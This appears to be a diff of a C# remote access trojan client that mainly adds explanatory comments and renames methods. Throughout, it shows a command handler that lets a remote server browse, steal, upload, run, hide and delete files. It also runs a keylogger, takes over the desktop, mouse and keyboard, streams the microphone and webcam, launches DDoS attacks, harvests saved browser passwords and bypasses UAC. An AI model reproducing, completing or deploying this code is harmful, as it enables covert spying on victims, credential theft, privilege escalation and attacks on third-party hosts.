+                DriveInfo[] drives = DriveInfo.GetDrives(); //Get the drives on the machine
 
-                String info = "";
+                String info = ""; //Declare the response string
 
-                foreach (DriveInfo d in drives)
+                foreach (DriveInfo d in drives) //Go thorugh the drivers
                 {
-                    if (d.IsReady)
+                    if (d.IsReady) //Driver is ready (browsable)
                     {
-                        info += d.Name + "|" + d.TotalSize + "\n";
+                        info += d.Name + "|" + d.TotalSize + "\n"; //Get the name and size of the drive
                     }
-                    else
+                    else //Driver is not ready
                     {
-                        info += d.Name + "\n";
+                        info += d.Name + "\n"; //Get the name of the driver
                     }
                 }
 
-                String resp = "fdrivel§" + info;
-                sendCommand(resp);
+                String resp = "fdrivel§" + info; //Create a response command
+                SendCommand(resp); //Respond to the server
             }
 
-            if (text.StartsWith("fdir§"))
+            if (text.StartsWith("fdir§")) //List file and folders of a folder
             {
-                String path = text.Split('§')[1];
+                String path = text.Split('§')[1]; //The directory to list
                 Console.WriteLine(path);
-                bool passed = false;
-                if (path.Length == 3 && path.Contains(":\\"))
+                bool passed = false; //If path is correct
+                if (path.Length == 3 && path.Contains(":\\")) //Path is a driver
                 {
-                    passed = true;
+                    passed = true; //Path is valid
                 }
-                if (!passed && Directory.Exists(path))
+                if (!passed && Directory.Exists(path)) //If path is not a driver, check if it's a directory
                 {
-                    passed = true;
+                    passed = true; //Valid path
                 }
-                if (!passed)
+                if (!passed) //Validation failed
                 {
-                    reportError(errorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path);
+                    ReportError(ErrorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path); //Report error to server
                     return;
                 }
                 Console.WriteLine("Valid = true");
-                String[] directories = Directory.GetDirectories(path);
-                String[] files = Directory.GetFiles(path);
+                String[] directories = Directory.GetDirectories(path); //Get the sub folders
+                String[] files = Directory.GetFiles(path); //Get the sub files
                 List<String> dir = new List<String>();
                 List<String> file = new List<String>();
                 String fi = "";
                 String di = "";
 
-                foreach (String d in directories)
+                foreach (String d in directories) //Go thorugh the folders
                 {
-                    String size = "N/A";
-                    String name = d.Replace(path, "");
-                    String crtime = Directory.GetCreationTime(d).ToString();
-                    String pth = d;
-                    String cont = name + "§" + size + "§" + crtime + "§" + pth;
-                    dir.Add(cont);
+                    String size = "N/A"; //Can't calculate the folder sizes for now
+                    String name = d.Replace(path, ""); //Get the short name of the folder
+                    String crtime = Directory.GetCreationTime(d).ToString(); //Get hte creation time of this folder
+                    String pth = d; //Get the full path of the folder
+                    String cont = name + "§" + size + "§" + crtime + "§" + pth; //Create response string
+                    dir.Add(cont); //Add to response object
                 }
 
-                foreach (String f in files)
+                foreach (String f in files) //Go throught the files
                 {
-                    String size = new FileInfo(f).Length.ToString();
-                    String name = Path.GetFileName(f);
-                    String crtime = File.GetCreationTime(f).ToString();
-                    String pth = f;
-                    String cont = name + "§" + size + "§" + crtime + "§" + pth;
-                    file.Add(cont);
+                    String size = new FileInfo(f).Length.ToString(); //Get the size of the file
+                    String name = Path.GetFileName(f); //Get the short name of the file
+                    String crtime = File.GetCreationTime(f).ToString(); //Get hte creation time of the file
+                    String pth = f; //Get the full path of the file
+                    String cont = name + "§" + size + "§" + crtime + "§" + pth; //Create the response command
+                    file.Add(cont); //Add the response to the response object
                 }
 
-                foreach (String c in dir)
+                foreach (String c in dir) //Stringify the list
                 {
                     di += c + "\n";
                 }
 
-                foreach (String f in file)
+                foreach (String f in file) //Stringify the list
                 {
                     fi += f + "\n";
                 }
 
-                String final = di + fi;
-                sendCommand("fdirl" + final);
+                String final = di + fi; //Concat the two results
+                SendCommand("fdirl" + final); //Send files and folders to the server
             }
 
-            if (text.StartsWith("f1§"))
+            if (text.StartsWith("f1§")) //Travel 1 directory up
             {
-                String current = text.Split('§')[1];
+                String current = text.Split('§')[1]; //Get the current directory
                 Console.WriteLine(current);
 
-                if (current.Length == 3 && current.Contains(":\\"))
+                if (current.Length == 3 && current.Contains(":\\")) //Parent dir is a drive
                 {
-                    sendCommand("f1§drive");
+                    SendCommand("f1§drive");
                 }
-                else
+                else //Parent dir is a folder
                 {
-                    String parent = new DirectoryInfo(current).Parent.FullName;
+                    String parent = new DirectoryInfo(current).Parent.FullName; //Get the full path of it's parent folder
                     Console.WriteLine(parent);
-                    sendCommand("f1§" + parent);
+                    SendCommand("f1§" + parent); //Send back the new path
                 }
             }
 
-            if (text.StartsWith("fpaste§"))
+            if (text.StartsWith("fpaste§")) //Paste a file
             {
-                String source = text.Split('§')[2];
-                String target = text.Split('§')[1];
-                String mode = text.Split('§')[3];
-                String sourceType = "file";
-                if (!Directory.Exists(target))
+                String source = text.Split('§')[2]; //Source path of the file
+                String target = text.Split('§')[1]; //Destionation of the file
+                String mode = text.Split('§')[3]; //The mode (copy/move)
+                String sourceType = "file"; //The source type (dir/file)
+                if (!Directory.Exists(target)) //Destination isn't a directory
                 {
-                    reportError(errorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager");
+                    ReportError(ErrorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager"); //Report to server
                     return;
                 }
-                if (Directory.Exists(source)) sourceType = "dir";
-                switch (sourceType)
+                if (Directory.Exists(source)) sourceType = "dir"; //Source is a folder
+                switch (sourceType) //Check the sourceType
                 {
-                    case "dir":
+                    case "dir": //Source is a folder
                         if (mode == "1")
                         {
                             //Copy Directory
@@ -779,7 +1025,7 @@ namespace TutClient
                         }
                         break;
 
-                    case "file":
+                    case "file": //Source is a file
                         if (mode == "1")
                         {
                             //Copy File
@@ -794,505 +1040,498 @@ namespace TutClient
                 }
             }
 
-            if (text.StartsWith("fexec§"))
+            if (text.StartsWith("fexec§")) //Execute a file
             {
-                String path = text.Split('§')[1];
-                bool valid = false;
-                if (File.Exists(path)) valid = true;
-                if (Directory.Exists(path)) valid = true;
-                if (!valid)
+                String path = text.Split('§')[1]; //The path to execute
+                bool valid = false; //Check if the path is valid
+                if (File.Exists(path)) valid = true; //Path points to a file
+                if (Directory.Exists(path)) valid = true; //Path points to a folder
+                if (!valid) //Invalid path
                 {
-                    reportError(errorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager");
+                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager"); //Report to server
                     return;
                 }
-                Process.Start(path);
+                Process.Start(path); //Execute the file
             }
 
-            if (text.StartsWith("fhide§"))
+            if (text.StartsWith("fhide§")) //Set the hidden attribute for a file
             {
-                String path = text.Split('§')[1];
-                bool valid = false;
-                if (File.Exists(path)) valid = true;
-                if (Directory.Exists(path)) valid = true;
-                if (!valid)
+                String path = text.Split('§')[1]; //The file to hide
+                bool valid = false; //Check if the path is valid
+                if (File.Exists(path)) valid = true; //Path points to a file
+                if (Directory.Exists(path)) valid = true; //Path poinst to a folder
+                if (!valid) //Invalid path
                 {
-                    reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
+                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path); //Report to the server
                     return;
                 }
 
-                File.SetAttributes(path, FileAttributes.Hidden);
+                File.SetAttributes(path, FileAttributes.Hidden); //Hide the file
             }
 
-            if (text.StartsWith("fshow§"))
+            if (text.StartsWith("fshow§")) //Remove the hidden attribute from a file
             {
-                String path = text.Split('§')[1];
-                bool valid = false;
-                if (File.Exists(path)) valid = true;
-                if (Directory.Exists(path)) valid = true;
-                if (!valid)
+                String path = text.Split('§')[1]; //The path of the file
+                bool valid = false; //Check if the path is a valid
+                if (File.Exists(path)) valid = true; //Path is a file
+                if (Directory.Exists(path)) valid = true; //Path is a folder
+                if (!valid) //Path is invalid
                 {
-                    reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
+                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path); //Report error to server
                     return;
                 }
-                File.SetAttributes(path, FileAttributes.Normal);
+                File.SetAttributes(path, FileAttributes.Normal); //Set the file attributes to normal
             }
 
-            if (text.StartsWith("fdel§"))
+            if (text.StartsWith("fdel§")) //Delete a file
             {
-                String path = text.Split('§')[1];
-                if (Directory.Exists(path))
+                String path = text.Split('§')[1]; //Get the path of the file
+                if (Directory.Exists(path)) //Path is a folder
                 {
-                    Directory.Delete(path, true);
+                    Directory.Delete(path, true); //Remove the folder recursive
                 }
-                else if (File.Exists(path))
+                else if (File.Exists(path)) //Path is a file
                 {
-                    File.Delete(path);
+                    File.Delete(path); //Remove the file
                 }
-                else
+                else //Invalid path
                 {
-                    reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path);
+                    ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path); //Report error to the server
                 }
             }
 
-            if (text.StartsWith("frename§"))
+            if (text.StartsWith("frename§")) //Rename a file
             {
-                String path = text.Split('§')[1];
-                String name = text.Split('§')[2];
-                bool isDir = false;
-                String target = "";
-                if (Directory.Exists(path)) isDir = true;
-                if (isDir)
+                String path = text.Split('§')[1]; //The path of the file to rename
+                String name = text.Split('§')[2]; //The new name of the file
+                bool isDir = false; //Check if the path points to a folder
+                String target = ""; //The new path of the renamed file
+                if (Directory.Exists(path)) isDir = true; //Path is a folder
+                if (isDir) //Path is folder
                 {
-                    target = new DirectoryInfo(path).Parent.FullName + "\\" + name;
-                    Directory.Move(path, target);
+                    target = new DirectoryInfo(path).Parent.FullName + "\\" + name; //Create the new path of the folder
+                    Directory.Move(path, target); //Rename the folder
                 }
-                else
+                else //Path is a file
                 {
-                    if (!File.Exists(path))
+                    if (!File.Exists(path)) //Path is a non-existent file
                     {
-                        reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path);
+                        ReportError(ErrorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path); //Report the error to the server
                         return;
                     }
-                    target = new FileInfo(path).Directory.FullName + "\\" + name;
-                    File.Move(path, target);
+                    target = new FileInfo(path).Directory.FullName + "\\" + name; //Create the new path of the file
+                    File.Move(path, target); //Rename the file
                 }
             }
 
-            if (text.StartsWith("ffile§"))
+            if (text.StartsWith("ffile§")) //Create a new file
             {
-                String path = text.Split('§')[1];
-                String name = text.Split('§')[2];
-                String fullPath = path + "\\" + name;
+                String path = text.Split('§')[1]; //Get the parent folder
+                String name = text.Split('§')[2]; //Get the name of the file
+                String fullPath = path + "\\" + name; //Create the path of the file
 
                 //Overwrite existing
-                if (File.Exists(path)) File.Delete(path);
+                if (File.Exists(fullPath)) File.Delete(fullPath);
 
-                using (FileStream fs = File.Create(fullPath))
-                {
-                    Byte[] info = new UTF8Encoding(true).GetBytes("");
-                    // Add some information to the file.
-                    fs.Write(info, 0, info.Length);
-                }
+                File.Create(fullPath).Close(); //Close the open stream, to prevent blocking access to the file
             }
-            if (text.StartsWith("fndir§"))
+            if (text.StartsWith("fndir§")) //Create a new folder
             {
-                String path = text.Split('§')[1];
-                String name = text.Split('§')[2];
-                String fullPath = path + "\\" + name;
+                String path = text.Split('§')[1]; //Get the parent folder
+                String name = text.Split('§')[2]; //Get the name of the folder
+                String fullPath = path + "\\" + name; //Create the path of the new folder
                 //Overwrite existing
                 if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
 
-                Directory.CreateDirectory(fullPath);
+                Directory.CreateDirectory(fullPath); //Create the folder
             }
-            if (text.StartsWith("getfile§"))
+            if (text.StartsWith("getfile§")) //Read the contents of a text based file
             {
-                String path = text.Split('§')[1];
-                if (!File.Exists(path))
+                String path = text.Split('§')[1]; //Get the path of the file
+                if (!File.Exists(path)) //Path is not a file
                 {
-                    reportError(errorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path);
+                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path); //Report error to server
                     return;
                 }
-                String content = File.ReadAllText(path);
-                String back = "backfile§" + content;
-                sendCommand(back);
+                String content = File.ReadAllText(path); //Read the file
+                String back = "backfile§" + content; //Create the response command
+                SendCommand(back); //Send the file contents back to the server
             }
-            if (text.StartsWith("putfile§"))
+            if (text.StartsWith("putfile§")) //Write contents of a text based file
             {
-                String path = text.Split('§')[1];
-                String content = text.Split('§')[2];
+                String path = text.Split('§')[1]; //The path of the file to write
+                String content = text.Split('§')[2]; //The content to write to the file
 
-                if (!File.Exists(path))
+                if (!File.Exists(path)) //Path is not a file
                 {
-                    reportError(errorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path);
+                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path); //Report error to the server
                     return;
                 }
-                File.WriteAllText(path, content);
+                File.WriteAllText(path, content); //Write all content to the file
             }
-            if (text.StartsWith("fup"))
+            if (text.StartsWith("fup")) //Upload file
             {
-                String location = text.Split('§')[1];
-                if (File.Exists(location)) //prev. !File.Exists(location) -> bug
+                String location = text.Split('§')[1]; //Get the location of the new file
+                if (File.Exists(location)) //Check if the file already exists
                 {
-                    reportError(errorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!");
+                    ReportError(ErrorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!"); //Report error to the server
                     return;
                 }
-                int size = int.Parse(text.Split('§')[2]);
-                fup_location = location;
-                fup_size = size;
-                isFileDownload = true;
-                recvFile = new byte[fup_size];
-                sendCommand("fconfirm");
+                int size = int.Parse(text.Split('§')[2]); //Get the size of the file
+                fup_location = location; //Set the save location for the file
+                fup_size = size; //Set the size of the file to receive
+                isFileDownload = true; //Set the socket to file download mode
+                recvFile = new byte[fup_size]; //Create a new buffer for the file
+                SendCommand("fconfirm"); //Confirm to start streaming the file
             }
-            if (text.StartsWith("fdl§"))
+            if (text.StartsWith("fdl§")) //Download a file
             {
-                String file = text.Split('§')[1];
-                if (!File.Exists(file))
+                String file = text.Split('§')[1]; //The file the server wants to download
+                if (!File.Exists(file)) //File doesn't exist
                 {
-                    reportError(errorType.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + file);
+                    ReportError(ErrorType.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + file); //Report error to the server
                     return;
                 }
-                String size = new FileInfo(file).Length.ToString();
-                fdl_location = file;
-                sendCommand("finfo§" + size);
+                String size = new FileInfo(file).Length.ToString(); //Get the size of the file
+                fdl_location = file; //Store the location of the file
+                SendCommand("finfo§" + size); //Send the file's size to the server
             }
-            if (text == "fconfirm")
+            if (text == "fconfirm") //Server confirmed to received a file
             {
-                Byte[] sendFile = File.ReadAllBytes(fdl_location);
-                sendByte(sendFile);
+                Byte[] sendFile = File.ReadAllBytes(fdl_location); //Read the bytes of the file
+                SendByte(sendFile); //Send the file to the server
             }
-            if (text == "dc")
+            if (text == "dc") //Server disconnected us
             {
-                Thread.Sleep(3000);
-                isDisconnect = true;
-                StopIPCHandler();
+                Thread.Sleep(3000); //Wait for the server to restart
+                isDisconnect = true; //Set request breaking to true
+                StopIPCHandler(); //Stop IPC connections
             }
-            if (text == "sklog")
+            if (text == "sklog") //Start the keylogger
             {
-                if (!isKlThreadRunning)
+                if (!isKlThreadRunning) //Check if keylogger thread is not created
                 {
+                    //Create and start the keylogger
                     Thread t = new Thread(new ThreadStart(Keylogger.Logger));
                     t.Start();
                     isKlThreadRunning = true;
                 }
-                if (isKlThreadRunning && !Keylogger.letRun)
+                if (isKlThreadRunning && !Keylogger.letRun) //Thread is created but keylogger is stopped
                 {
-                    Keylogger.letRun = true;
+                    Keylogger.letRun = true; //Start the keylogger
                 }
 
             }
-            if (text == "stklog")
+            if (text == "stklog") //Stop the keylogger
             {
-                if (isKlThreadRunning && Keylogger.letRun) Keylogger.letRun = false;
+                if (isKlThreadRunning && Keylogger.letRun) Keylogger.letRun = false; //If thread is created and keylogger is running, then stop it
             }
-            if (text == "rklog")
+            if (text == "rklog") //Read the keylogger's buffer
             {
-                String dump = Keylogger.KeyLog;
-                sendCommand("putklog" + dump);
+                String dump = Keylogger.KeyLog; //Get the logger's buffer
+                SendCommand("putklog" + dump); //Send the buffer to the server
             }
-            if (text == "cklog")
+            if (text == "cklog") //Clear the keylogger's buffer
             {
-                Keylogger.LastWindow = "";
-                Keylogger.KeyLog = "";
+                Keylogger.LastWindow = ""; //Clear the last window var
+                Keylogger.KeyLog = ""; //Clear the buffer of the logger
             }
-            if (text == "rdstart")
+            if (text == "rdstart") //Start a remote desktop session
             {
-                Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen));
-                RDesktop.isShutdown = false;
-                rd.Start();
+                Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen)); //Create a new thread for the remote desktop
+                RDesktop.isShutdown = false; //Enable the remote desktop to run
+                rd.Start(); //Start the remote desktop
             }
-            if (text == "rdstop")
+            if (text == "rdstop") //Stop the remote desktop
             {
-                RDesktop.isShutdown = true;
+                RDesktop.isShutdown = true; //Disable the remote desktop
             }
-            if (text.StartsWith("rmove-"))
+            if (text.StartsWith("rmove-")) //Move the mouse
             {
-                string[] t = text.Split('-');
-                string[] x = t[1].Split(':');
-                Cursor.Position = new System.Drawing.Point(int.Parse(x[0]), int.Parse(x[1]));
+                string[] t = text.Split('-'); //Get the command parts
+                string[] x = t[1].Split(':'); //Get the coordinate parts
+                Cursor.Position = new System.Drawing.Point(int.Parse(x[0]), int.Parse(x[1])); //Set the position of the mouse
             }
-            if (text.StartsWith("rtype-"))
+            if (text.StartsWith("rtype-")) //Type with the keyboard
             {
                 //Console.WriteLine("received write command");
-                string[] t = text.Split('-');
+                string[] t = text.Split('-'); //Get the command parts
                 if (t[1] != "rtype")
                 {
-                    SendKeys.SendWait(t[1]);
+                    SendKeys.SendWait(t[1]); //Send the key to the OS
 
-                    SendKeys.Flush(); //never forget to flush ha!
+                    SendKeys.Flush(); //Flush to don't store the keys in a buffer
                 }
 
             }
-            if (text.StartsWith("rclick-"))
+            if (text.StartsWith("rclick-")) //Click with the mouse
             {
-                string[] t = text.Split('-');
-                MouseEvent(t[1], t[2]);
+                string[] t = text.Split('-'); //Get the command parts
+                MouseEvent(t[1], t[2]); //Generate a new mouse event
                 //Cursor.Position = new System.Drawing.Point(729, 182);
             }
-            if (text == "alist")
+            if (text == "alist") //List the installed audio input devices
             {
-                List<NAudio.Wave.WaveInCapabilities> source = new List<NAudio.Wave.WaveInCapabilities>();
-                String send = "";
+                List<NAudio.Wave.WaveInCapabilities> source = new List<NAudio.Wave.WaveInCapabilities>(); //Create a new source list
+                String send = ""; //Declare response
 
-                for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++)
+                for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++) //Loop through the devices
                 {
-                    source.Add(NAudio.Wave.WaveIn.GetCapabilities(i));
+                    source.Add(NAudio.Wave.WaveIn.GetCapabilities(i)); //Add the device to the list
                 }
 
-                foreach (var src in source)
+                foreach (var src in source) //Go through the valid devices
                 {
-                    send += src.ProductName + "|" + src.Channels.ToString() + "§";
+                    send += src.ProductName + "|" + src.Channels.ToString() + "§"; //Create the data command
                 }
 
-                send = send.Substring(0, send.Length - 1);
-                send = "alist" + send;
-                sendCommand(send);
+                send = send.Substring(0, send.Length - 1); //Format the result
+                send = "alist" + send; //Craft the reponse to the server
+                SendCommand(send); //Send response to the server
             }
 
-            if (text.StartsWith("astream"))
+            if (text.StartsWith("astream")) //Start streaming audio
             {
                 try
                 {
-                    String devNum = text.Split('§')[1];
-                    int deviceNumber = int.Parse(devNum);
-                    NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent();
-                    audioSource.DeviceNumber = deviceNumber;
-                    audioSource.WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels);
-                    audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(sendAudio);
-                    streaming = audioSource;
-                    audioSource.StartRecording();
+                    String devNum = text.Split('§')[1]; //Get the device number to stream auido from
+                    int deviceNumber = int.Parse(devNum); //Convert the number to int
+                    NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent
+                    {
+                        DeviceNumber = deviceNumber, //The device ID
+                        WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels) //The format of the wave
+                    }; //Create a new wave reader
+                    audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(SendAudio); //Attach to new audio event
+                    streaming = audioSource; //Set the global audio source
+                    audioSource.StartRecording(); //Start receiving data from mic
                 }
-                catch (Exception)
+                catch (Exception) //Wrong device ID
                 {
-                    reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!");
+                    ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!"); //Report error to the server
                 }
             }
-            if (text == "astop")
+            if (text == "astop") //Stop streaming audio
             {
-                streaming.StopRecording();
-                streaming.Dispose();
+                streaming.StopRecording(); //Stop receiving audio from the mic
+                streaming.Dispose(); //Dispose the audio input
                 streaming = null;
             }
-            if (text == "wlist")
+            if (text == "wlist") //List the camera devices
             {
-                string captureDevices = "";
-                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                int i = 0;
+                string captureDevices = ""; //Declare response string
+                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get the video input devices on this machine
+                int i = 0; //Count of the devices
 
-                foreach (FilterInfo device in devices)
+                foreach (FilterInfo device in devices) //Go through the devices
                 {
-                    captureDevices += i.ToString() + "|" + device.Name + "§";
-                    i++;
+                    captureDevices += i.ToString() + "|" + device.Name + "§"; //Append the ID and the name of the device
+                    i++; //Increment the ID
                 }
 
                 if (captureDevices != "") captureDevices = captureDevices.Substring(0, captureDevices.Length - 1); //remove the split char ('§') from the end
-                sendCommand("wlist" + captureDevices);
+                SendCommand("wlist" + captureDevices); //Send response to the server
             }
-            if (text.StartsWith("wstream"))
+            if (text.StartsWith("wstream")) //Stream camera
             {
-                int id = int.Parse(text.Split('§')[1]);
+                int id = int.Parse(text.Split('§')[1]); //The ID of the device to stream the image of
 
-                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                if (devices.Count == 0)
+                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get all video input devices
+                if (devices.Count == 0) //No devices
                 {
-                    reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", "The selected device is not found!");
+                    ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", "The selected device is not found!"); //Report error to the server
                     return;
                 }
                 int i = 0;
-                FilterInfo dName = new FilterInfo("");
+                FilterInfo dName = new FilterInfo(""); //Create a new empty device
 
-                foreach (FilterInfo device in devices)
+                foreach (FilterInfo device in devices) //Loop through the video devices
                 {
-                    if (i == id)
+                    if (i == id) //If the IDs match
                     {
-                        dName = device;
+                        dName = device; //Set the device
                     }
-                    i++;
+                    i++; //Increment the ID
                 }
 
                 Console.WriteLine(dName.Name);
 
-                source = new VideoCaptureDevice(dName.MonikerString);
-                source.NewFrame += new NewFrameEventHandler(source_NewFrame);
-                source.Start();
+                source = new VideoCaptureDevice(dName.MonikerString); //Get the capture device
+                source.NewFrame += new NewFrameEventHandler(Source_NewFrame); //Attach a new image handler
+                source.Start(); //Start receiving images from the camera
             }
-            if (text == "wstop")
+            if (text == "wstop") //Stop the camera stream
             {
-                source.Stop();
+                source.Stop(); //Stop receiving images from the camera
                 source = null;
             }
-            if (text.StartsWith("ddosr"))
+            if (text.StartsWith("ddosr")) //Start a new DDoS attack
             {
-                String[] p = text.Split('|');
-                String ip = p[1];
-                String port = p[2];
-                String protocol = p[3];
-                String packetSize = p[4];
-                String threads = p[5];
-                String delay = p[6];
+                String[] p = text.Split('|'); //Get the command parts
+                String ip = p[1]; //Get the IP of the remote machine
+                String port = p[2]; //Get the port to attack on
+                String protocol = p[3]; //Get the protocol to use
+                String packetSize = p[4]; //Get the packet size to send
+                String threads = p[5]; //Get the threads to attack with
+                String delay = p[6]; //Get the delay between packet sends
 
-                DDoS = new ddos(ip, port, protocol, packetSize, threads, delay);
-                DDoS.startDdos();
+                DDoS = new DDoS(ip, port, protocol, packetSize, threads, delay); //Create a new DDoS module
+                DDoS.StartDdos(); //Start the attack
             }
           
-            if (text.StartsWith("ddosk"))
+            if (text.StartsWith("ddosk")) //Kill the DDoS attack
             {
-                DDoS.stopDdos();
+                DDoS.StopDDoS(); //Stop attacking
             }
 
-            if (text == "getpw")
+            if (text == "getpw") //Get the passwords of major installed browsers
             {
-                bool validOperation = true;
-                String app = Application.StartupPath;
-                if (!File.Exists(app + "\\ff.exe"))
+                bool validOperation = true; //Checks if PF exists
+                String app = Application.StartupPath; //Get the startup path
+                if (!File.Exists(app + "\\ff.exe")) //Check if PF is not present
                 {
-                    validOperation = false;
+                    validOperation = false; //Invalid operation
                 }
 
-                if (validOperation)
+                if (validOperation) //If PF is present
                 {
-                    passwordManager pm = new passwordManager();
-                    String[] passwd = pm.getSavedPassword();
-                    String gcpw = "gcpw\n" + passwd[0];
-                    String iepw = "iepw\n" + passwd[1];
-                    String ffpw = "ffpw\n" + passwd[2];
-                    sendCommand(iepw);
+                    PasswordManager pm = new PasswordManager(); //Create a new password manager module
+                    String[] passwd = pm.GetSavedPassword(); //Get the saved passwords
+                    String gcpw = "gcpw\n" + passwd[0]; //Get Google Chrome Passwords
+                    String iepw = "iepw\n" + passwd[1]; //Get Internet Explorer Passwords
+                    String ffpw = "ffpw\n" + passwd[2]; //Get Firefox passwords
+                    SendCommand(iepw); //Send IE passwords
                     Console.WriteLine("iepw sent");
                     Thread.Sleep(1000);
-                    sendCommand(gcpw);
+                    SendCommand(gcpw); //Send GC passwords
                     Console.WriteLine("gcpw sent");
                     Thread.Sleep(1000);
-                    sendCommand(ffpw);
+                    SendCommand(ffpw); //Send FF passwords
                     Console.WriteLine("ffpw sent");
+                    //Dispose the passwords
                     pm = null;
                     gcpw = null;
                     iepw = null;
                     ffpw = null;
                     return;
                 }
-                else
+                else //PF isn't present
                 {
-                    sendCommand("getpwu");
-                    reportError(errorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!");
-                    /*if (isgetpwu) return;
-                    sendCommand("getpwu");
-                    isgetpwu = true;
-                    WebClient wc = new WebClient();
-                    wc.DownloadFile("http://www.nirsoft.net/toolsdownload/passwordfox.zip", app + "\\ffcp.zip");
-                    System.IO.Compression.ZipFile.ExtractToDirectory(app + "\\ffcp.zip", app + "\\ffex");
-                    System.IO.File.Copy(app + "\\ffex\\PasswordFox.exe", app + "\\ff.exe");
-                    System.IO.Directory.Delete(app + "\\ffex");
-                    System.IO.File.Delete(app + "\\ffcp.zip");
-                    isgetpwu = false;*/
+                    SendCommand("getpwu"); //Send back empty results
+                    ReportError(ErrorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!"); //Report error to the server
                 }
             }
 
-            if (text == "getstart")
+            if (text == "getstart") //Get the startup folder of the client
             {
-                String app = Application.StartupPath;
-                sendCommand("setstart§" + app);
+                String app = Application.StartupPath; //Get the startup folder
+                SendCommand("setstart§" + app); //Send it to the server
             }
 
-            if (text == "uacload")
+            if (text == "uacload") //Auto download the UAC bypassing toolkit
             {
-                UAC uac = new UAC();
-                foreach (int progress in uac.AutoLoadBypass())
+                UAC uac = new UAC(); //Create a new UAC module
+                foreach (int progress in uac.AutoLoadBypass()) //Update the progress of the download
                 {
-                    sendCommand("uacload§" + progress.ToString());
+                    SendCommand("uacload§" + progress.ToString()); //Send the progress to the server
                 }
             }
 
-            if (text == "uacbypass")
+            if (text == "uacbypass") //Bypass the UAC
             {
-                UAC uac = new UAC();
-                if (uac.IsAdmin())
+                UAC uac = new UAC(); //Create a new UAC module
+                if (uac.IsAdmin()) //Check if we run as elevated
                 {
-                    sendCommand("uac§a_admin");
+                    SendCommand("uac§a_admin"); //Notify the Server and don't re-bypass
                     return;
                 }
 
                 try
                 {
-                    bool success = uac.BypassUAC();
-                    if (success) sendCommand("uac§s_admin");
-                    else sendCommand("uac§f_admin");
+                    bool success = uac.BypassUAC(); //Try to bypass the UAC
+                    if (success) SendCommand("uac§s_admin"); //UAC bypassed!! :)
+                    else SendCommand("uac§f_admin"); //Failed to bypass UAC :(
                 }
-                catch (Exception ex)
+                catch (Exception ex) //Something went wrong
                 {
-                    uac.ProbeStart(UAC.ProbeMethod.StartUpFolder);
+                    uac.ProbeStart(UAC.ProbeMethod.StartUpFolder); //Fallback to probing the statup folder
                 }
             }
 
-            if (text.StartsWith("writeipc§"))
+            if (text.StartsWith("writeipc§")) //Write to a process with remote IPC
             {
-                string idAndMessage = text.Substring(text.IndexOf('§') + 1);
-                string message = idAndMessage.Substring(idAndMessage.IndexOf('§') + 1);
-                _ipcClient.WriteStream(message);
+                string idAndMessage = text.Substring(text.IndexOf('§') + 1); //Get command parameters
+                string message = idAndMessage.Substring(idAndMessage.IndexOf('§') + 1); //Get the message to send
+                _ipcClient.WriteStream(message); //Sen the message to the IPC server
             }
 
-            if (text.StartsWith("startipc§"))
+            if (text.StartsWith("startipc§")) //Start a new IPC connection
             {
-                string servername = text.Substring(text.IndexOf('§') + 1);
-                StartIPCHandler();
-                LaunchIPCChild(servername);
+                string servername = text.Substring(text.IndexOf('§') + 1); //The server to start
